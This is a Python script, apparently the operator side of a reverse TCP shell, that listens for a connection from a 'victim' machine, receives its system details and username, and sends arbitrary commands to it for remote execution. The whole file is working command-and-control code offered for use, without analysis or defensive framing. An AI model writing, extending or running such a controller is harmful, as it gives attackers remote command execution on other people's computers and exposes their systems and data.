import socket,getopt,os,sys
from termcolor import colored, cprint

try:
	import nmap
except Exception as e:
	print(str(e))


def usage():

	print("\nReverse TCP (Server) by Dex")
	print()
	print("Usage: server.py <ip to listen on> <port>")
	print("Example: server.py 192.168.0.60 (internal ip) 8000")
	print("Example: server.py 53.63.215.73 (external ip) 1337")
	sys.exit(0)

def main():

	host = ''
	port = 0

	if not len(sys.argv[1:]):
		usage()

	try:
		ip = str(sys.argv[1])
		port = int(sys.argv[2])
	except:
		print("[!] No Arguments Specified!")
		usage()
		sys.exit(1)
	
	listener(host,port)

def listener(host,port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	s.bind((host,port))
	s.listen(1)

	print("Listening on %s:%d" % (host, port))

	try:
		conn, addr = s.accept()
	except KeyboardInterrupt:
		print("[*] User Requested Interrupt.")
		sys.exit(0)

	console(conn, addr)

	s.close()

def sysinfo(conn):
	# receives sysinfo sent by victim upon connection
	sysinfo = conn.recv(2048)
	sysinfo = sysinfo.decode('utf-8')
	sysinfo = sysinfo.split(",")

	# puts it all into one little handy string.
	x_info = 'Operating System: '+ '%s\n' % (sysinfo[0])
	x_info += 'Computer Name: '+ '%s\n' % (sysinfo[1])
	x_info += 'Kernel Version: '+ '%s\n' % (sysinfo[2])
	x_info += 'Release Version: '+ '%s\n' % (sysinfo[3])
	x_info += 'System Version: '+ '%s\n' % (sysinfo[4])
	x_info += 'Username:'+ '%s\n' % (sysinfo[5])

	print(x_info)

def console(conn, addr):
	print("Connection established from %s" % (str(addr[0])))

	try:
		while 1:
			comminput = input("> ")

			if comminput == "exec":
				comminput = comminput.encode('utf-8')
				conn.send(comminput)
				execinput = input("[*] Enter command to execute: ")

				# preps input for sending across to victim.
				execinput = execinput.encode('utf-8')
				conn.send(execinput)

				# decodes result as string.
				result = conn.recv(1024)
				result = result.decode('utf-8')
				print(result)

			elif comminput == "clear":
				os.system("clear")

			elif comminput == "help":
				help_list = {}
				help_list["exec"] = "Execute argument as command on Remote Host"
				help_list["sysinfo"] = "Display Remote System Information"
				help_list["exit"] = "Sends exit command to Remote Host then exits"
				help_list["clear"] = "Clears the terminal"
				help_list["help"] = "Displays this help message"

				returned = ("\n Command") + " - "
				returned += ("Description\n" + ("-" * 50))

				# puts the help output in a fancy list
				for x in sorted(help_list):
					dec = help_list[x]
					returned += "\n  " + x + " - " + dec + "\n"
				print(returned.rstrip("\n"))

			elif comminput == "sysinfo":
				sysinfo(conn)

			elif comminput == "exit":
				comminput = comminput.encode('utf-8')
				conn.send(comminput)

				break

			elif comminput == "nmap":
				print("lol")

			else:
				print("[!] Unknown Command")
	except KeyboardInterrupt:
		print("[!] Keyboard Interrupt Received.")
		exitsig = "exit"
		exitsig = exitsig.encode('utf-8')
		conn.send(exitsig)
		os.system('clear')

	# closes the connection if loop is broken
	conn.close()

if __name__ == "__main__":
	main()
